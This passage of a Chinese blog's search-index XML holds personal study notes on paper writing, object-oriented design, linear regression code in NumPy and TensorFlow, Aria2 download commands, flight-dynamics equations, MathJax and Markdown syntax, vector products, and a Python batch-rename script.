    <content type="text"><![CDATA[看到一篇有关如何撰写科技论文的好文章，赶紧摘抄一下。 原则（规则 1–4）写作即交流。因此，读者体验是首等重要的，所有的写作服务于这一目标。当你写作时，心中要时时有读者。以下四条规则是关于如何赢取读者。 规则 1：论文有一个中心主旨，并体现在标题中规则 2：假设写作对象对论文内容一无所知规则 3：坚持原因、内容和结论（Context-Content-Conclusion／C-C-C）结构规则 4：避免委婉，使用并行优化的逻辑流论文组成（规则 5-8）论文的摘要、介绍、结果与讨论都适用于 C-C-C 结构，但各有些许不同。在下图中，我们将讨论这些专门结构的问题： 规则 5：在摘要中总结所有要点规则 6：在介绍中讨论这篇论文的重要性规则 7：用多个逻辑相关的陈述句（可辅以图表）给出支持论文中心思想的结果规则 8：讨论如何填补差距、论文的局限性和论文与该领域的相关性写作流程（规则 9 和 10）规则 9：把时间花费到关键的地方：题目、摘要、图和大纲规则 10：获取反馈，然后简化、重新使用、再次构造这个故事参考链接 从标题到写作流程：写好一篇论文的十条基本原则,by 机器之心.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面向对象编程的设计原则]]></title>
    <url>%2F2019%2F01%2F17%2F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99%2F</url>
    <content type="text"><![CDATA[说来惭愧，我虽然计算机科学专业科班出生，但是对面向对象编程的理解并不透彻。但在看到“如何写一手漂亮的模型：面向对象编程的设计原则综述”后，感觉收获不少，欣喜之余赶紧摘抄记录一下。 面向对象编程的设计原则为了写出清晰的、高质量的、可维护并且可扩展的代码，面向对象编程（OOP）将是我们最佳的选择。 对象类型因为我们要围绕对象来建立代码，所以区分它们的不同责任和变化是有用的。一般来说，面向对象的编程有三种类型的对象。 实体对象这类对象通常对应着问题空间中的一些现实实体。比如我们要建立一个角色扮演游戏（RPG），那么简单的 Hero 类就是一个实体对象。 这类对象通常包含关于它们自身的属性（例如 health 或 mana），这些属性根据具体的规则都是可修改的。 控制对象（Control Object）控制对象（有时候也称作管理对象）主要负责与其它对象的协调，这是一些管理并调用其它对象的对象。我们上面的 RPG 案例中有一个很棒的例子，Fight 类控制两个英雄，并让它们对战。 在这种类中，为对战封装编程逻辑可以给我们提供多个好处：其中之一就是动作的可扩展性。我们可以很容易地将参与战斗的英雄传递给非玩家角色（NPC），这样它们就能利用相同的 API。我们还可以很容易地继承这个类，并复写一些功能来满足新的需要。 边界对象（Boundary Object）这些是处在系统边缘的对象。任何一个从其它系统获取输入或者给其它系统产生输出的对象都可以被归类为边界对象，无论那个系统是用户，互联网或者是数据库。 这些边界对象负责向系统内部或者外部传递信息。例如对要接收的用户指令，我们需要一个边界对象来将键盘输入（比如一个空格键）转换为一个可识别的域事件（例如角色的跳跃）。 Bonus：值对象（Value Object）价值对象代表的是域（domain）中的一个简单值。它们无法改变，不恒一。 如果将它们结合在我们的游戏中，Money 类或者 Damage 类就表示这种对象。上述的对象让我们容易地区分、寻找和调试相关功能，然而仅使用基础的整形数组或者整数却无法实现这些功能。 它们可以归类为实体对象的子类别。 关键设计原则设计原则是软件设计中的规则，过去这些年里已经证明它们是有价值的。严格地遵循这些原则有助于软件达到一流的质量。 抽象（Abstraction）抽象就是将一个概念在一定的语境中简化为原始本质的一种思想。它允许我们拆解一个概念来更好的理解它。 上面的游戏案例阐述了抽象，让我们来看一下 Fight 类是如何构建的。我们以尽可能简单的方式使用它，即在实例化的过程中给它两个英雄作为参数，然后调用 fight() 方法。不多也不少，就这些。 封装封装可以被认为是将某些东西放在一个类以内，并限制了它向外部展现的信息。在软件中，限制对内部对象和属性的访问有助于保证数据的完整性。 将内部编程逻辑封装成黑盒子，我们的类将更容易管理，因为我们知道哪部分可以被其它系统使用，哪些不行。这意味着我们在保留公共部分并且保证不破坏任何东西的同时能够重用内部逻辑。此外，我们从外部使用封装功能变得更加简单，因为需要考虑的事情也更少。 分解分解就是把一个对象分割为多个更小的独立部分，这些独立的部分更易于理解、维护和编程。 试想我们现在希望 Hero 类能结合更多的 RPG 特征，例如 buffs，资产，装备，角色属性。 解决方案就是将 Hero 对象分解为多个更小的对象，每个小对象可承担一些功能。 下面是三种分解关系： 关联：在两个组成部分之间定义一个松弛的关系。两个组成部分不互相依赖，但是可以一起工作。例如 Hero 对象和 Zone 对象。 聚合：在整体和部分之间定义一个弱「包含」关系。这种关系比较弱，因为部分可以在没有整体的时候存在。例如 HeroInventory（英雄财产）和 Item（条目）。HeroInventory 可以有很多 Items，而且一个 Items 也可以属于任何 HeroInventory（例如交易条目）。 组成：一个强「包含」关系，其中整体和部分不能彼此分离。部分不能被共享，因为整体要依赖于这些特定的部分。例如 Hero（英雄）和 HeroAttributes（英雄属性）。 泛化泛化可能是最重要的设计原则，即我们提取共享特征，并将它们结合到一起的过程。我们都知道函数和类的继承，这就是一种泛化。 做一个比较可能会将这个解释得更加清楚：尽管抽象通过隐藏非必需的细节减少了复杂性，但是泛化通过用一个单独构造体来替代多个执行类似功能的实体。 在给出的例子中，我们将常用的 Hero 类和 NPC 类泛化为一个共同的父类 Entity，并通过继承简化子类的构建。 这里，我们通过将它们的共同功能移动到基本类中来减少复杂性，而不是让 NPC 类和 Hero 类将所有的功能都实现两次。 组合组合就是把多个对象结合为一个更复杂对象的过程。这种方法会创建对象的示例，并且使用它们的功能，而不是直接继承它。 使用组合原则的对象就被称作组合对象（composite object）。这种组合对象在要比所有组成部分都简单，这是非常重要的一点。当把多个类结合成一个类的时候，我们希望把抽象的层次提高一些，让对象更加简单。 组合对象的 API 必须隐藏它的内部模块，以及内部模块之间的交互。就像一个机械时钟，它有三个展示时间的指针，以及一个设置时间的旋钮，但是它内部包含很多运动的独立部件。 正如我所说的，组合要优于继承，这意味着我们应该努力将共用功能移动到一个独立的对象中，然后其它类就使用这个对象的功能，而不是将它隐藏在所继承的基本类中。 批判性思考尽管这些设计原则是在数十年经验中形成的，但盲目地将这些原则应用到代码之前进行批判性思考是很重要的。 任何事情都是过犹不及！有时候这些原则可以走得很远，但是实际上有时会变成一些很难使用的东西。 作为一个工程师，我们需要根据独特的情境去批判地评价最好的方法，而不是盲目地遵从并应用任意的原则。 关注点的内聚、耦合和分离内聚（Cohesion）内聚代表的是模块内部责任的分明，或者是模块的复杂度。 如果我们的类只执行一个任务，而没有其它明确的目标，那么这个类就有着高度内聚性。另一方面，如果从某种程度而言它在做的事情并不清楚，或者具有多于一个的目标，那么它的内聚性就非常低。 我们希望代码具有较高的内聚性，如果发现它们有非常多的目标，或许我们应该将它们分割出来。 耦合耦合获取的是连接不同类的复杂度。我们希望类与其它的类具有尽可能少、尽可能简单的联系，所以我们就可以在未来的事件中交换它们（例如改变网络框架）。 在很多编程语言中，这都是通过大量使用接口来实现的，它们抽象出处理特定逻辑的类，然后表征为一种适配层，每个类都可以嵌入其中。 分离关注点分离关注点（SoC）是这样一种思想：软件系统必须被分割为功能上互不重叠的部分。或者说关注点必须分布在不同的地方，其中关注点表示能够为一个问题提供解决方案。 网页就是一个很好的例子，它具有三个层（信息层、表示层和行为层），这三个层被分为三个不同的地方（分别是 HTML，CSS，以及 JS）。 如果重新回顾一下我们的 RPG 例子，你会发现它在最开始具有很多关注点（应用 buffs 来计算袭击伤害、处理资产、装备条目，以及管理属性）。我们通过分解将那些关注点分割成更多的内聚类，它们抽象并封装了它们的细节。我们的 Hero 类现在仅仅作为一个组合对象，它比之前更加简单。 结语对小规模的代码应用这些原则可能看起来很复杂。但是事实上，对于未来想要开发和维护的任何一个软件项目而言，这些规则都是必须的。在刚开始写这种代码会有些成本，但是从长期来看，它会回报以几倍增长。 这些原则保证我们的系统更加： 可扩展：高内聚使得不用关心不相关的功能就可以更容易地实现新模块。可维护：低耦合保证一个模块的改变通常不会影响其它模块。高内聚保证一个系统需求的改变只需要更改尽可能少的类。可重用：高内聚保证一个模块的功能是完整的，也是被妥善定义的。低耦合使得模块尽可能少地依赖系统的其它部分，这使得模块在其它软件中的重用变得更加容易。 参考链接 如何写一手漂亮的模型：面向对象编程的设计原则综述,by 机器之心. 什么是面向切面编程AOP？,by 知乎. 什么是面向方面编程,by liuweitoo. AOP面向方面编程,by 规速. 团队开发框架实战—面向切面的编程 AOP,by Bobby0322. 轻松理解AOP(面向切面编程),by -望远-. 依赖注入,by android-cn.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习之线性回归问题求解]]></title>
    <url>%2F2019%2F01%2F12%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E9%97%AE%E9%A2%98%E6%B1%82%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[在统计学中，线性回归（Linear regression）是利用称为线性回归方程的最小二乘函数对一个或多个自变量和因变量之间关系进行建模的一种回归分析。这种函数是一个或多个称为回归系数的模型参数的线性组合。只有一个自变量的情况称为简单回归，大于一个自变量情况的叫做多元回归。下面以简单线性回归为例，以机器学习的方法求解此问题。 问题设定已知有 $N$ 个 $x, y$ 对构成数据集 $X, Y$ ，他们在坐标轴上的分布如下图： 现在希望找到一个函数： h(x) = wx+b这个函数会尽可能的拟合数据集 $X, Y$ ，为了做到这点，我们希望这个函数 $h(x)$ 在 $X$ 上每一个取值 $x_i$ 的函数值 $h(x_i)$ 与 $Y$ 上每一个对应的 $y_i$ 的平方差尽可能小。即找到一组 $w, b$ ，能使得 $loss(w, b)$ 最小。 loss(w, b) = \frac{1}{N}\sum^{N}_{i=0}(wx_i+b-y_i)^2问题求解采用梯度下降法找到目标 $w, b$，先随机初始化一对 $w_0, b_0$。由于函数的负梯度方向是函数值下降最快的方向，因此对 $w, b$ 求其偏微分: \begin{aligned} \frac{\partial loss(w, b)}{\partial w} &= \frac{2}{N}\sum^{N}_{i=0}(wx_i+b-y_i)\cdot x_i, \\ \frac{\partial loss(w, b)}{\partial b} &= \frac{2}{N}\sum^{N}_{i=0}(wx_i+b-y_i) \end{aligned}再通过下式在每次迭代中更新 $w, b$ ： \begin{aligned} w_{t+1} &= w_t - \eta \frac{\partial l(w_t, b_t)}{\partial w_t} \\ b_{t+1} &= b_t - \eta \frac{\partial l(w_t, b_t)}{\partial b_t} \end{aligned}其中， $\eta$ 是学习率。 python实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546# -*- coding: utf-8 -*-# %matplotlib inlineimport matplotlib.pyplot as pltimport numpy as np# 生成100对x, ydata_count = 100w_cache, b_cache, l_cache, = [], [], []# 学习速度learning_rate = 0.003# 迭代次数training_steps = 3000x_data = np.linspace(-20, 20, data_count)y_data = np.multiply(4, x_data) + 7 + np.random.normal(loc=0, scale=8.0, size=(data_count,))# 初始化w和bw = np.random.rand()b = np.random.rand()y_predict = w * x_data + b# 梯度下降迭代3000次for iteration in range(training_steps): y_predict = w * x_data + b diff = y_predict - y_data error = np.sum(np.square(diff)) / data_count grad_w = np.mean(diff * x_data) grad_b = np.mean(diff) w -= learning_rate * grad_w b -= learning_rate * grad_b w_cache.append(w) b_cache.append(b) l_cache.append(error)y_predict = w * x_data + b# 绘制结果plt.figure(figsize=(10, 6))plt.scatter(x_data, y_data, s=10, color=&apos;g&apos;)plt.plot(x_data, y_predict)plt.title(&apos;y=4x+7&apos;)plt.xlabel(&apos;x&apos;)plt.ylabel(&apos;y&apos;)plt.show() tensorflow实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081# -*- coding: utf-8 -*-import tensorflow as tfimport matplotlib.pyplot as pltimport numpy as np# 初始化变量和模型参数，定义训练闭环中的运算# 生成100对x, ydata_count = 100# 超参数，实际的训练迭代次数training_steps=1000# 超参数，学习速率learning_rate=0.003# 定义tf graph输入X = tf.placeholder(tf.float32)Y = tf.placeholder(tf.float32)# 定义模型参数W = tf.Variable(np.random.randn(), name=&quot;weight&quot;, dtype=tf.float32)b = tf.Variable(np.random.randn(), name=&quot;bias&quot;, dtype=tf.float32)def inference(X): # 计算推断模型在数据X上的输出，并将结果返回 pred = tf.add(tf.multiply(W, X), b) return preddef loss(X,Y): # 依据训练数据X及其期望输出Y计算损失 pred = tf.add(tf.multiply(W, X), b) cost = tf.reduce_sum(tf.pow(pred-Y, 2)) / data_count return costdef inputs(): # 读取或生成训练数据X及其期望输出Y x_data = np.linspace(-20, 20, data_count) y_data = np.multiply(4, x_data) + 7 + np.random.normal(loc=0, scale=8.0, size=(data_count,)) return (x_data,y_data)def train(total_loss): # 依据计算的总损失训练或调整模型参数 optimizer = tf.train.GradientDescentOptimizer(learning_rate).minimize(total_loss) return optimizer def evaluate(sess,X,Y): # 对训练得到的模型进行评估 # 因为是线性回归，这里只图示 plt.figure(figsize=(10, 6)) plt.scatter(X, Y, s=10, color=&apos;g&apos;) pred=inference(X) plt.plot(X, sess.run(pred)) plt.title(&apos;y=4x+7&apos;) plt.xlabel(&apos;x&apos;) plt.ylabel(&apos;y&apos;) plt.show() # 在一个会话对象中启动数据流图，搭建流程with tf.Session() as sess: tf.initialize_all_variables().run() X,Y=inputs() total_loss=loss(X,Y) train_op=train(total_loss) coord=tf.train.Coordinator() threads=tf.train.start_queue_runners(sess=sess,coord=coord) for step in range(training_steps): sess.run([train_op]) # 出于调试和学习的目的，查看损失在训练过程中递减的情况 if step % 10 ==0: print(&quot;loss: &quot;,sess.run([total_loss])) evaluate(sess,X,Y) coord.request_stop() coord.join(threads) sess.close() 参考文献 线性回归, by wikipedia. 重拾基础 - 线性回归（一）, by Cerulean.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
        <tag>tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源跨平台下载利器Aria2]]></title>
    <url>%2F2019%2F01%2F07%2F%E5%BC%80%E6%BA%90%E8%B7%A8%E5%B9%B3%E5%8F%B0%E4%B8%8B%E8%BD%BD%E5%88%A9%E5%99%A8Aria2%2F</url>
    <content type="text"><![CDATA[长期以来，迅雷一直是我在Windows平台上首选的下载工具。但是随着迅雷软件升级更新后的下载限速和广告推销的愈演愈烈，我终于下定决心卸载了它。下面我推荐一款开源跨平台的下载利器Aria2。 Aria2简介Aria2是一款自由、跨平台命令行界面的下载管理器，该软件根据GPLv2许可证进行分发。支持的下载协议有：HTTP、HTTPS、FTP、Bittorrent和Metalink。 不同于Wget这样的的命令行界面下载器，Aria2不仅支持BitTorrent，还能够从各种来源多路检索所请求的文件。包括HTTP，HTTPS，FTP和BitTorrent协议。aria2使用Metalink数据块的校验和自动查验BitTorrent下载的数据部分。 安装配置从Aria2官网下载最新Aria2安装包，当前Aria2最新的版本为1.34.0。 将下载的Aria2安装包aria2-1.34.0-win-64bit-build1解压到C盘目录，并将Aria2安装目录添加到Windows环境变量PATH。 重启后，打开Windows终端，即可在命令行中使用Aria2下载文件。 使用帮助从Web中下载文件： 1aria2c http://example.org/mylinux.iso 从2个源下载文件： 1aria2c http://a/f.iso ftp://b/f.iso 使用2个连接下载文件：1aria2c -x2 http://a/f.iso BitTorrent下载：1aria2c http://example.org/mylinux.torrent BitTorrent Magnet URI下载：1aria2c &apos;magnet:?xt=urn:btih:248D0A1CD08284299DE78D5C1ED359BB46717D8C&apos; 按照txt中给出的URI下载：1aria2c -i uris.txt 参考链接 Aria2,by wikipedia. Aria2 Homepage,by Aria2.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[飞行仿真之刚体六自由度方程]]></title>
    <url>%2F2019%2F01%2F06%2F%E9%A3%9E%E8%A1%8C%E4%BB%BF%E7%9C%9F%E4%B9%8B%E5%88%9A%E4%BD%93%E5%85%AD%E8%87%AA%E7%94%B1%E5%BA%A6%E6%96%B9%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[在飞行仿真中，获取飞机的位姿是基本要求。将飞行器视为刚体，根据牛顿第二定律和动量矩定理，即可推导出飞机的质心运动方程和飞机绕质心转动的动力学方程，即刚体的六自由度方程。下面即从《航空飞行器飞行动力学》中摘抄刚体六自由度方程的推导过程。 飞行器质心运动方程根据牛顿第二定理： m\frac{dV}{dt}=F \tag{1}式中$m$为飞行器质量，$V$为飞行器飞行速度矢量，$F$为作用于质心处外力的合力矢量。 具体研究飞行器质心运动规律时，工程上常建立投影正在一动坐标系的标量方程，并认为大气时静止的。 一般动坐标系中质心动力学方程取原点位于飞行器质心的一动坐标系$Oxyz$，它相对惯性坐标系$O_gx_gy_gz_g$有一转动角速度$w$。质心的绝对速度为$V$，如图1所示。 图1 动系相对于惯性坐标系的关系 将速度$V$和角速度$w$分别在动坐标系上投影，则有 $$V=V_xi+V_yj+V_zk \tag{2}$$ $$w=w_xi+w_yj+w_zk \tag{3}$$ 式中$i,j,k$为动坐标系$Oxyz$的单位矢量。由于$w$存在，其方向将随时间变化。 将公式$(2)和(3)$带入公式$(1)$，则速度$V$的微分，即质心的绝对加速度为： $$ \frac{F}{m}=\frac{dV}{dt}=\frac{dV_x}{dt}i+\frac{dV_y}{dt}j+\frac{dV_z}{dt}k+V_x\frac{di}{dt}+V_y\frac{dj}{dt}+V_z\frac{dk}{dt} \tag{4} $$ 式中单位矢量导数$di/dt$是矢量端点$i$的速度，此时矢端曲线是绕$w$旋转的圆，因此： $$\frac{di}{dt}=w\times i$$ $$\frac{dy}{dt}=w\times y$$ $$\frac{dz}{dt}=w\times z$$ 将上述关系代入公式$(4)$，即可知质心的绝对加速度可表示为 $$\frac{F}{m}=\frac{dV}{dt}=\frac{\delta V}{\delta t}+w \times V \tag{5}$$ 其中： $$\frac{\delta V}{\delta t}=\frac{dV_x}{dt}i+\frac{dV_y}{dt}j+\frac{dV_z}{dt}k$$ 式(5)中 $\frac{\delta V}{\delta t}$ 为动系角速度 $w=0$ 时的加速度，即相当于观察者站在动坐标系中所看到的质心加速度；$w\times V$为由于存在角速度 $w$ 使 $V$ 相对于动坐标系方向发生变化而产生的加速度；$\frac{dV}{dt}$ 为质心的绝对加速度，即观察者在地面坐标系上所看到的加速度。 同样合力矢量$F$用动坐标系上投影表示为： $$F=F_xi+F_yj+F_zk$$ 于是式(5)在动坐标系$Oxyz$上投影的质心动力学标量方程如下： $$m(\frac{dV_x}{dt}+V_zw_y-V_yw_z)=F_x$$ $$m(\frac{dV_y}{dt}+V_xw_z-V_zw_x)=F_y$$ $$m(\frac{dV_z}{dt}+V_yw_x-V_xw_y)=F_z$$ 上述方程组适用于任何动坐标系。 # 飞行器绕质心的动力学方程 根据动量矩定理，飞行器绕质心的转动运动可表示为： $$M=\frac{dh}{dt} \tag{6}$$ 式中$h$为飞行器对坐标系原点的动量矩；$M$为作用在飞行器上的外力对原点的合力矩。 图2 对质心的动量矩 根据动量矩定义，飞行器上任意微元质量为dm，对坐标系原点的动量矩为： \Delta h=r\times V dm式中$r$为微元质量到坐标系原点的矢径；$V$为该微元质量的速度矢量，则 V=V_o+w\times r式中$V_o$为坐标系原点速度（如坐标原点取为飞行器质心，则为质心速度）；$w$为坐标系转动角速度。 于是飞行器的总动量矩可积分得出 h=\int r\times V dm=\int r dm \times V_o +\int r \times (w \times r) dm取坐标系原点为质心时，有 \int r dm=0飞行器动量矩简化为 h=\int r \times (w\times r) dm \tag{7}上式表明，飞行器的动量矩只取决于转动产生的速度部分，而与质心运动速度$V_o$无关。矢径$r$和角速度$w$用坐标系中投影分量表示为： r=xi+yj+zkw=w_xi+w_yj+w_zk将上述关系式代入式$(7)$，经整理得： h_x=w_xI_x-w_yI_{xy}-w_zI_{zx}h_y=w_yI_y-w_xI_{xy}-w_zI_{yx}h_z=w_zI_z-w_xI_{zx}-w_yI_{yz}式中$I_x$,$I_y$,$I_z$分别为飞行器对$O_x$轴,$O_y$轴,$O_z$轴地惯性矩，分别为： I_x=\int (y^2+z^2) dmI_y=\int (x^2+z^2) dmI_z=\int (x^2+y^2) dm而$I{xy}$, $I{yz}$, $I_{zx}$ 则为对 $O_x$ 轴与 $O_y$ 轴，$O_y$ 轴与 $O_z$ 轴，$O_z$ 轴与 $O_x$ 轴的惯性积，分别为： I_{xy}=\int xy dmI_{yz}=\int yz dmI_{zx}=\int zx dm一般动坐标系中绕质心转动动力学方程具体研究飞行器绕质心转动规律时，矢量形式的式$(6)$使用不便。工程习惯上将其投影在一动坐标系上建成方程的标量形式。此时动坐标系在空中以$w$转动，类同于加速度$\frac{dV}{dt}$，动量矩可以表示为： M=\frac{dh}{dt}=\frac{\delta h}{\delta t}+w\times h类似一般动坐标系中质心动力学方程的推导，最终可得转动运动方程的标量形式为： \frac{dh_x}{dt}+h_zw_y-h_yw_z=M_x\frac{dh_y}{dt}+h_xw_z-h_zw_x=M_y\frac{dh_z}{dt}+h_yw_x-h_xw_y=M_z参考文献 方振平,陈万春,张曙光. 航空飞行器飞行动力学[M]. 2015. 旋转变换（一）旋转矩阵,by csxiaoshui. 飞行仿真—3.刚体六自由度方程、变换矩阵与四元数,by WFYX. 判断三维坐标系旋转正方向的简单方法,by Wonderffee. （番外）姿态与旋转矩阵（I）,by Tam Alex. 一点关于机器人学和计算机视觉中的坐标变换的理解,by Kissrabbit. 飞机是怎么飞起来的,by J Pan. 如何获得飞机运动方程,by J Pan.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>飞行力学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MathJax语法笔记]]></title>
    <url>%2F2019%2F01%2F05%2FMathJax%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[MathJax是一个跨浏览器的JavaScript库，它使用MathML、LaTeX和ASCIIMathML标记在Web浏览器中显示数学符号。MathJax是在Apache许可证下作为开源软件发布的。 安装MathJaxMathJax有三种安装方式：最简单的方法就是使用分布式网络服务中的MathJax的副本，它位于 cdn.mathjax.org ,但是你也可以下载并安装一个MathJax的副本到你的服务器,或者使用在你本地硬盘的副本（这样是不需要使用网络）。 官方文档里有详细的描述。 MathJax语法如何插入公式LaTeX的数学公式有两种：行中公式和独立公式。行中公式放在文中与其它文字混编，独立公式单独成行。 行中公式可以用如下两种方法表示： (数学公式) 或 $数学公式$ 独立公式可以用如下两种方法表示： [数学公式] 或 $$数学公式$$ 打Tag和引用公式如果在某个公式之后，又想要引用原公式并说明原公式的出处，可以用 tagging/labelling/referencing system来做。 可以用 \tag{yourtag} 来给原公式打 Tag。 m\frac{dV}{dt}=F \tag{1}如果在后面需要引用它，就在 \tag 后面加上 \label{somelabel}，yourtag 和 somelabel不一定要一样，但最好一样。 参考链接 MathJax, by wikipedia. MathJax使用LaTeX语法编写数学公式教程, by knight. MathJax Home, by mathjax.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Markdown语法笔记]]></title>
    <url>%2F2019%2F01%2F05%2FMarkdown%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[一直使用Markdown编辑文档，偶尔会遇到使用一些特殊Markdown语法，为了防止遗忘，特在此记录一下。 强调在Markdown中，可以使用 * 和 _ 表示斜体，用 ** 表示加粗。例如： Coding，让开发更简单 Coding，让开发更简单 Coding，让开发更简单 引用Markdown 标记区块引用和 email 中用 『&gt;』的引用方式类似，只需要在整个段落的第一行最前面加上 『&gt;』 ： Coding.net 为软件开发者提供基于云计算技术的软件开发平台，包括项目管理，代码托管，运行空间和质量控制等等。 区块引用可以嵌套，只要根据层次加上不同数量的『&gt;』： 这是第一级引用。 这是第二级引用。 现在回到第一级引用。 参考链接 Markdown 语法介绍, by coding.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[向量点积叉积及其几何意义]]></title>
    <url>%2F2019%2F01%2F05%2F%E5%90%91%E9%87%8F%E7%82%B9%E7%A7%AF%E5%8F%89%E7%A7%AF%E5%8F%8A%E5%85%B6%E5%87%A0%E4%BD%95%E6%84%8F%E4%B9%89%2F</url>
    <content type="text"><![CDATA[在3D游戏开发中，经常用到向量的点积和叉积及其几何意义，为防止遗忘，在此记录一下。 点积在数学中，点积（德语：Skalarprodukt、英语：Dot Product）又称数量积或标量积（德语：Skalarprodukt、英语：Scalar Product），是一种接受两个等长的数字序列（通常是坐标向量）、返回单个数字的代数运算。在欧几里得几何中，两个笛卡尔坐标向量的点积常称为内积（德语：inneres Produkt、英语：Inner Product），见内积空间。 定义点积有两种定义方式：代数方式和几何方式。通过在欧氏空间中引入笛卡尔坐标系，向量之间的点积既可以由向量坐标的代数运算得出，也可以通过引入两个向量的长度和角度等几何概念来求解。 代数定义两个向量 $\vec{a} = [a1, a2,…, an]$和 $\vec{b} = [b1, b2,…, bn]$的点积定义为： \vec{a}\cdot \vec{b} = \sum_{i=1}^n a_ib_i = a_1b_1 + a_2b_2 + \cdots + a_nb_n这里的Σ是求和符号，而n是向量空间的维数。 几何定义在欧几里得空间中，点积可以直观地定义为 \vec{a} \cdot \vec{b} = |\vec{a}| \, |\vec{b}| \cos \theta \;这里 $|\vec{x}|$ 表示 $\vec{x}$的模（长度）， $\theta$ 表示两个向量之间的角度。 叉积在数学和向量代数领域，叉积（英语：Cross product）又称向量积（英语：Vector product），是对三维空间中的两个向量的二元运算，使用符号 $\times$。与点积不同，它的运算结果是向量。对于线性无关的两个向量 $\mathbf {a}$ 和 $\mathbf {b}$ ，它们的叉积写作 ${\mathbf {a} \times \mathbf {b} }$，是 $\mathbf {a}$ 和 $\mathbf {b}$ 所在平面的法线向量，与 $\mathbf {a}$ 和 $\mathbf {b}$ 都垂直。叉积被广泛运用于数学、物理、工程学、计算机科学领域。 定义两个向量 $\mathbf {a}$ 和 $\mathbf {b}$ 的叉积仅在三维空间中有定义，写作 ${\displaystyle \mathbf {a} \times \mathbf {b} }$。在物理学中，叉积有时也被写成${\displaystyle \mathbf {a} \wedge \mathbf {b} }$，但在数学中 ${\displaystyle \mathbf {a} \wedge \mathbf {b} }$ 是外代数中的外积。 叉积 ${\displaystyle \mathbf {a} \times \mathbf {b} }$ 是与 $\mathbf {a}$ 和 $\mathbf {b}$ 都垂直的向量 $\mathbf {c}$ 。其方向由右手定则决定，模长等于以两个向量为边的平行四边形的面积。 叉积可以定义为： {\displaystyle \mathbf {a} \times \mathbf {b} =\|\mathbf {a} \|\|\mathbf {b} \|\sin(\theta )\ \mathbf {n} }其中$\theta$ 表示 $\mathbf {a}$ 和 $\mathbf {b}$ 在它们所定义的平面上的夹角（ ${\displaystyle 0^{\circ }\leq \theta \leq 180^{\circ }}$）。 ${\displaystyle |\mathbf {a} |}$ 和 ${\displaystyle |\mathbf {b} |}$ 是向量$\mathbf {a}$ 和 $\mathbf {b}$ 的模长，而 $\mathbf{n}$ 则是一个与 $\mathbf {a}$ 、 $\mathbf {b}$ 所构成的平面垂直的单位向量，方向由右手定则决定。根据上述公式，当$\mathbf {a}$ 与 $\mathbf {b}$ 平行（即 $\theta$ 为 0° 或 180°）时，它们的叉积为零向量 $\mathbf{0}$。 矩阵表示叉积可以表达为这样的行列式： {\displaystyle \mathbf {u\times v} ={\begin{vmatrix}\mathbf {i} &\mathbf {j} &\mathbf {k} \\u_{1}&u_{2}&u_{3}\\v_{1}&v_{2}&v_{3}\\\end{vmatrix}}}这个行列式可以使用萨吕法则或拉普拉斯展开计算。使用拉普拉斯展开可以沿第一行展开为： {\displaystyle {\begin{aligned}\mathbf {u\times v} &={\begin{vmatrix}u_{2}&u_{3}\\v_{2}&v_{3}\end{vmatrix}}\mathbf {i} -{\begin{vmatrix}u_{1}&u_{3}\\v_{1}&v_{3}\end{vmatrix}}\mathbf {j} +{\begin{vmatrix}u_{1}&u_{2}\\v_{1}&v_{2}\end{vmatrix}}\mathbf {k} \\&=(u_{2}v_{3}-u_{3}v_{2})\mathbf {i} -(u_{1}v_{3}-u_{3}v_{1})\mathbf {j} +(u_{1}v_{2}-u_{2}v_{1})\mathbf {k} \end{aligned}}}可以直接得到结果向量。 参考链接 叉积, by wikipedia. 数量积, by wikipedia. 向量点乘（内积）和叉乘（外积、向量积）概念及几何意义解读, by -牧野-.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python批量重命名文件]]></title>
    <url>%2F2019%2F01%2F01%2FPython%E6%89%B9%E9%87%8F%E9%87%8D%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[最近从iData中下载了很多学术论文，这些论文文件名都以“www.cn-ki.net_”开头，一个个重命名太麻烦，于是使用如下python3脚本批量重命名文件。123456789101112131415161718192021222324# Python3 code to rename multiple # files in a directory or folder # importing os module import os # Function to rename multiple files def main(): # search file in current directory for filename in os.listdir(&quot;.&quot;): if os.path.isfile(filename): if &quot;www.cn-ki.net_&quot; in filename[0:14]: src=filename dst=filename[14:] # rename the special file os.rename(src, dst) # Driver Code if __name__ == &apos;__main__&apos;: # Calling main() function main()]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TL-WR703N版本v1.7刷openwrt教程]]></title>
    <url>%2F2018%2F12%2F31%2FTL-WR703N%E7%89%88%E6%9C%ACv1-7%E5%88%B7openwrt%E6%95%99%E7%A8%8B%2F</url>
